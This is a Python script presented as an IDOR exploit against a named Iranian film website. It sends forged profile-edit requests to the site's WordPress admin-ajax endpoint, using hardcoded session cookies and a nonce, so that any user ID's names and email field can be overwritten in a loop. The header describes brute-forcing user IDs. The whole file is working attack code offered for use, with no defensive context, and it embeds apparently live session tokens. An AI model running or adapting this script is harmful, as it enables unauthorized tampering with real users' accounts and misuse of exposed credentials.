# Idor exploit 
#vunrable website : https://sorenfilm.ir
# Bug Found by HackerIrani
# Exploit by @Cloud_Lad you can find me in telegram
# With this bug you can change the name of all acounet in website with the user id and for get the user id we brute force the id !!

import datetime
import requests
import os
from time import sleep
import random
from colorama import Fore , Back



def main():
    os.system("cls")
    print("""
        
/$$$$$$$  /$$                     /$$              /$$$$$$            /$$       /$$                    
| $$__  $$| $$                    | $$             /$$__  $$          |__/      | $$                    
| $$  \ $$| $$  /$$$$$$   /$$$$$$$| $$   /$$      | $$  \__/  /$$$$$$  /$$  /$$$$$$$  /$$$$$$   /$$$$$$ 
| $$$$$$$ | $$ |____  $$ /$$_____/| $$  /$$/      |  $$$$$$  /$$__  $$| $$ /$$__  $$ /$$__  $$ /$$__  $$
| $$__  $$| $$  /$$$$$$$| $$      | $$$$$$/        \____  $$| $$  \ $$| $$| $$  | $$| $$$$$$$$| $$  \__/
| $$  \ $$| $$ /$$__  $$| $$      | $$_  $$        /$$  \ $$| $$  | $$| $$| $$  | $$| $$_____/| $$      
| $$$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$ \  $$      |  $$$$$$/| $$$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$      
|_______/ |__/ \_______/ \_______/|__/  \__/       \______/ | $$____/ |__/ \_______/ \_______/|__/      
                                                            | $$                                        
                                                            | $$                                        
                                                            |__/                                        
                            Develop by : @Cloud_Lad 
""")
    
    while True:
        Ac_Login = "https://sorenfilm.ir/wp-admin/admin-ajax.php"
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
        'From': 'Hacked@Hacked.example'  # This is another valid field
}

        cookies = {'wordpress_sec_a67d3fb95c0241d649ce9eeffb715017':'Trminator%7C1680363658%7CmGUTHtEsl0Ni4sQbNJV6lceb9eQIfd3d8p0Oh6H8Qks%7C41b6fb323df6bd230613c8008680d5ee8dc30ba1d3e05e01dcaac0f5e7d6a8d6',
                   'wordpress_logged_in_a67d3fb95c0241d649ce9eeffb715017':'Trminator%7C1680363658%7CmGUTHtEsl0Ni4sQbNJV6lceb9eQIfd3d8p0Oh6H8Qks%7C5424ef9975ae938c4497ddbbae3ffe80025a4aad8472d5e7ae7170fed9cbe046',
                   'PHPSESSID':'6f2b7c008982f9ca8d912f8a703b3251',}
        
        User_Id = input("Enter the user ID : ")
        first_name = input("Enter the first_name : ")
        last_name = input("Enter the last_name : ")
        display_name = input("Enter the display_Name : ")
        now = datetime.datetime.now()

        ex_ploit = requests.post(Ac_Login,cookies=cookies,headers=headers,data= {
        
        'action':"ajaxEditProfWPF",
        'nonce' : "c989816549",
        'user_id': User_Id,
        'first_name' : first_name,
        'last_name' : last_name,
        'display_name' : display_name,
        'email' : 'Trminator@gmail.com',
        'current_password':'',
        'new_password':'',
        'new_pass_verify': '',


    })
        print("---------------------------------------------------------------------------")
        print(f" User : {User_Id}" + f" Status_Code : {ex_ploit.status_code}")
        print(Fore.GREEN + "Done")
        sleep(5)
        print()
        

if __name__ == '__main__':
    main()